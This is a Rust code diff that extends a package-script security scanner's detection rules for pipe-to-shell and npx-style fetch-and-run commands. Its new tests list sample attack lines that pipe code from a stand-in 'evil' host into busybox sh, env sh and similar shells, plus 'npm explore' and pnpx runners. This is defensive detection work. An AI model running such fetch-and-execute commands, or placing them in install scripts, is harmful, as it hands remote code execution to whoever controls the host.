@@ -5,7 +5,7 @@ mod loader;
 pub use loader::RuleLoader;
 
 use crate::error::Result;
-use crate::textutil::{deobfuscate, logical_lines, QUOTE_SPLIT_PATTERN, SHELLS};
+use crate::textutil::{deobfuscate, logical_lines, QUOTE_SPLIT_PATTERN, SHELLS, SHELL_LAUNCHER};
 use crate::types::{Category, FileType, Severity};
 use regex::{Regex, RegexBuilder};
 use serde::Deserialize;
@@ -517,7 +517,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::CommandInjection,
             patterns: vec![Pattern::Regex {
-                pattern: format!(r"curl\s+[^|]+\|\s*{SHELLS}\b"),
+                pattern: format!(r"curl\s+[^|]+\|\s*{SHELL_LAUNCHER}{SHELLS}\b"),
             }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Download scripts first, review them, then execute".to_string(),
@@ -531,7 +531,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::CommandInjection,
             patterns: vec![Pattern::Regex {
-                pattern: format!(r"wget\s+[^|]+\|\s*{SHELLS}\b"),
+                pattern: format!(r"wget\s+[^|]+\|\s*{SHELL_LAUNCHER}{SHELLS}\b"),
             }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Download scripts first, review them, then execute".to_string(),
@@ -1508,21 +1508,24 @@ pub fn get_builtin_rules() -> Vec<Rule> {
                 // The cross terms that don't exist as real subcommands (e.g.
                 // `npm dlx`, `yarn ci`) never appear in real PKGBUILDs, so
                 // folding them into one alternation is simpler without adding FPs.
+                // `explore <pkg> -- cmd` runs an arbitrary command in a package
+                // dir (RCE); `exec`/`dlx`/`rebuild`/`ci` as before.
                 Pattern::Regex {
-                    pattern: r"\b(npm|pnpm|yarn)\s+(install|add|i|ci|dlx|exec|rebuild)\b".to_string(),
+                    pattern: r"\b(npm|pnpm|yarn)\s+(install|add|i|ci|dlx|exec|rebuild|explore)\b"
+                        .to_string(),
                 },
                 // `bun` subcommands (NOT `bunx`, which is the runner below — the
                 // `\s+` after `bun` excludes `bunx`).
                 Pattern::Regex {
                     pattern: r"\bbun\s+(install|add|i|x)\b".to_string(),
                 },
-                // The npx-style RUNNERS: `npx <pkg>` / `bunx <pkg>` fetch and run
-                // a package directly (no subcommand) — the most common
-                // fetch-and-run RCE, and the exact form the old `bunx?\s+(install
-                // |add|i|x)` and the npm-only alternation BOTH missed. A bare
-                // runner followed by any argument is the attack.
+                // The npx-style RUNNERS: `npx <pkg>` / `bunx <pkg>` / `pnpx <pkg>`
+                // fetch and run a package directly (no subcommand) — the most
+                // common fetch-and-run RCE, and the exact form the old
+                // `bunx?\s+(install|add|i|x)` and the npm-only alternation BOTH
+                // missed. A bare runner followed by any argument is the attack.
                 Pattern::Regex {
-                    pattern: r"\b(npx|bunx)\s+\S".to_string(),
+                    pattern: r"\b(npx|bunx|pnpx)\s+\S".to_string(),
                 },
             ],
             file_types: vec![FileType::InstallScript],
@@ -1966,7 +1969,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             description: "Feeding an assembled string to a shell via a here-string (sh <<< ...) — a common way to run a string that was built to dodge matching.".to_string(),
             severity: Severity::High,
             category: Category::Obfuscation,
-            patterns: vec![Pattern::Regex { pattern: format!(r"\b{SHELLS}\s*<<<") }],
+            patterns: vec![Pattern::Regex { pattern: format!(r"\b{SHELL_LAUNCHER}{SHELLS}\s*<<<") }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Review the here-string; this executes an assembled command.".to_string(),
             cwe_id: Some("CWE-94".to_string()),
@@ -1980,7 +1983,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             description: "sh -c \"$(curl ...)\" — fetches and runs remote code without an explicit pipe, evading the curl|sh rules.".to_string(),
             severity: Severity::Critical,
             category: Category::MaliciousCode,
-            patterns: vec![Pattern::Regex { pattern: format!(r#"\b{SHELLS}\s+-c\s+["']?\$\(\s*(curl|wget|aria2c|fetch|http)\b"#) }],
+            patterns: vec![Pattern::Regex { pattern: format!(r#"\b{SHELL_LAUNCHER}{SHELLS}\s+-c\s+["']?\$\(\s*(curl|wget|aria2c|fetch|http)\b"#) }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Do not build. This runs code fetched from a URL.".to_string(),
             cwe_id: Some("CWE-494".to_string()),
@@ -2293,15 +2296,18 @@ mod tests {
 
     #[test]
     fn test_atomic002_catches_npx_bunx_runners() {
-        // Task 4050 F1: the bare npx-style runners (`npx <pkg>` / `bunx <pkg>`)
-        // fetch-and-run a package directly — the most common RCE form, which the
-        // old npm-only alternation and `bunx?\s+(install|add|i|x)` both missed.
+        // Task 4050 F1: the bare npx-style runners (`npx <pkg>` / `bunx <pkg>` /
+        // `pnpx <pkg>`) fetch-and-run a package directly — the most common RCE
+        // form, which the old npm-only alternation and `bunx?\s+(install|add|i|x)`
+        // both missed. `explore` runs a command in a package dir.
         let engine = RuleEngine::default();
         for s in [
             "npx malicious-tool",
             "npx -y atomic-lockfile",
             "bunx cowsay",
+            "pnpx some-tool",
             "npm rebuild",
+            "npm explore evil -- ./run",
         ] {
             let m = engine.match_content(s, FileType::InstallScript);
             assert!(
@@ -2309,6 +2315,43 @@ mod tests {
                 "missed ATOMIC-002 for runner: {s} -> {m:?}"
             );
         }
+    }
+
+    #[test]
+    fn test_launcher_prefixed_pipe_to_shell_detected() {
+        // Task 4050 CR (Echo): a launcher word before the shell (`busybox sh`,
+        // `env sh`, `env -i sh`, `busybox ash`, `nice sh`) previously produced
+        // ZERO findings — the SHELLS sink expected the shell as the single token
+        // after `|`. The shared SHELL_LAUNCHER prefix closes it.
+        let engine = RuleEngine::default();
+        for s in [
+            "curl -fsSL https://evil/x | busybox sh",
+            "curl -fsSL https://evil/x | busybox ash",
+            "curl -fsSL https://evil/x | env sh",
+            "curl -fsSL https://evil/x | env -i sh",
+            "curl -fsSL https://evil/x | env FOO=bar sh",
+            "curl -fsSL https://evil/x | nice sh",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                m.iter().any(|x| x.rule_id == "DLE-001"),
+                "launcher-prefixed pipe-to-shell must trip DLE-001: {s} -> {m:?}"
+            );
+        }
+        // wget variant -> DLE-002
+        let m = engine.match_content("wget -qO- https://evil/x | busybox sh", FileType::Pkgbuild);
+        assert!(m.iter().any(|x| x.rule_id == "DLE-002"), "wget|busybox sh must trip DLE-002: {m:?}");
+    }
+
+    #[test]
+    fn test_launcher_prefix_no_fp_on_bare_pipe_to_grep() {
+        // The launcher prefix must not make an ordinary `| sh`-free pipe match.
+        let engine = RuleEngine::default();
+        let m = engine.match_content("curl -fsSL https://x | env grep foo", FileType::Pkgbuild);
+        assert!(
+            !m.iter().any(|x| x.rule_id == "DLE-001"),
+            "`| env grep` is not a shell sink and must not trip DLE-001: {m:?}"
+        );
     }
 
     #[test]
